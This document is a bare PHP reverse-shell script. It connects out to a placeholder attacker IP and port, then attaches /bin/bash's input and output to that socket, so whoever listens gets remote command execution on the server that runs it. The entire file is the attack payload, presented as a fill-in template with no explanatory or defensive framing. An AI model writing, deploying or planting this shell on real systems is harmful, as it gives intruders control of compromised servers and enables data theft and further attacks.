<?php
$ip = 'your_ip_address';
$port = your_port_number;
$shell = '/bin/bash';

$sock = fsockopen($ip, $port);

if ($sock) {
    $descriptorspec = array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    );

    $process = proc_open($shell, $descriptorspec, $pipes);

    if (is_resource($process)) {
        while ($f = fgets($pipes[2])) {
            fputs($sock, $f);
        }
    }
}
?>

